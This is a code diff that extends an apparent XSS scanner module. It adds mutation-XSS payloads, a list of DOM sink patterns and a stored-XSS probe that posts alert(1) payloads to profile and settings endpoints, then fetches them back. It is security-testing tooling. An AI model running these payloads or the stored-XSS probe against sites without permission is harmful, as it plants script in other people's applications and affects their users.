@@ -1,11 +1,12 @@
-from typing import Optional, Dict, List
+from typing import Optional
+
 import requests
 
-from tools.log_utils import get_logger
-from tools.http_client import build_url
-from tools.payload_engine import generate
 from tools.html_context_parser import probe_and_detect
-from tools.response_profiler import ResponseProfiler, CLEAN_VALUE
+from tools.http_client import build_url
+from tools.log_utils import get_logger
+from tools.payload_engine import generate
+from tools.response_profiler import ResponseProfiler
 from tools.settings import settings
 
 logger = get_logger("xss_detector")
@@ -24,6 +25,27 @@ POLYGLOT_PAYLOADS = [
     '<details open ontoggle=alert(1)>',
     '{{constructor.constructor("alert(1)")()}}',
 ]
+
+MUTATION_XSS_PAYLOADS = [
+    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+    '<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>',
+    '<svg><p><style><img src=x onerror=alert(1)>',
+    '<select><style></select><img src=x onerror=alert(1)>',
+]
+
+DOM_SINK_PATTERNS = [
+    "innerHTML",
+    "outerHTML",
+    "document.write",
+    "document.writeln",
+    ".insertAdjacentHTML",
+    "eval(",
+    "setTimeout(",
+    "setInterval(",
+    "new Function(",
+]
+
+STORE_AND_FETCH_PATHS = ["/profile", "/settings", "/api/user/update", "/api/profile"]
 
 CONTEXT_TO_PAYLOAD_KEY = {
     "html": "html",
@@ -71,11 +93,37 @@ def _is_in_html_context(html: str, marker: str, payload: str) -> bool:
         return False
     before = html[max(0, idx - 100):idx]
     after = html[idx + len(marker) + len(payload):idx + len(marker) + len(payload) + 100]
-    in_script = before.lower().rsfind('<script') > before.lower().rsfind('</script')
+    in_script = before.lower().rfind('<script') > before.lower().rfind('</script')
     in_html_tag = '<' in before.split('>')[-1] if '>' in before else '<' in before
     if in_script and not in_html_tag:
         return False
     return True
+
+
+def _check_dom_sink(html: str, payload: str) -> bool:
+    idx = html.find(payload)
+    if idx < 0:
+        return False
+    before = html[max(0, idx - 500):idx].lower()
+    for sink in DOM_SINK_PATTERNS:
+        if sink in before:
+            return True
+    return False
+
+
+def _detect_stored_xss(url: str, param: str, sess: requests.Session,
+                       timeout: float, payload: str, marker: str) -> bool:
+    base = url.rstrip("/")
+    test_val = marker + payload
+    for store_path in STORE_AND_FETCH_PATHS:
+        try:
+            sess.post(base + store_path, data={param: test_val}, timeout=timeout)
+            r = sess.get(base + store_path, timeout=timeout)
+            if marker in r.text and _payload_reflected_unescaped(r.text, payload):
+                return True
+        except Exception:
+            pass
+    return False
 
 
 def check(url: str, param: str, sess: Optional[requests.Session] = None,
@@ -162,6 +210,34 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
                     break
             except Exception as e:
                 logger.debug("xss polyglot: %s", e)
+
+    if result["vulnerable"] and not result["confirmed"]:
+        for payload in MUTATION_XSS_PAYLOADS:
+            try:
+                r = sess.get(build_url(url, param, payload), timeout=timeout)
+                if _payload_reflected_unescaped(r.text, payload):
+                    result["confirmed"] = True
+                    result["type"] = "mutation_xss"
+                    result["evidence"].append("mXSS: %s" % payload[:40])
+                    break
+            except Exception:
+                pass
+
+    if result["vulnerable"] and not result["confirmed"]:
+        r = sess.get(build_url(url, param, result.get("vector", "xss")), timeout=timeout)
+        if _check_dom_sink(r.text, result.get("vector", "")):
+            result["confirmed"] = True
+            result["evidence"].append("dom_sink_detected")
+
+    if not result["vulnerable"] or not result["confirmed"]:
+        for payload in MUTATION_XSS_PAYLOADS + POLYGLOT_PAYLOADS:
+            marker = REFLECTION_MARKERS[0]
+            if _detect_stored_xss(url, param, sess, timeout, payload, marker):
+                result["vulnerable"] = True
+                result["confirmed"] = True
+                result["type"] = "stored_xss"
+                result["evidence"].append("stored_xss: %s" % payload[:40])
+                break
 
     if result["vulnerable"] and not result["confirmed"] and HAS_BROWSER_VERIFY:
         verify_result = browser_verify(url, param, sess, timeout)
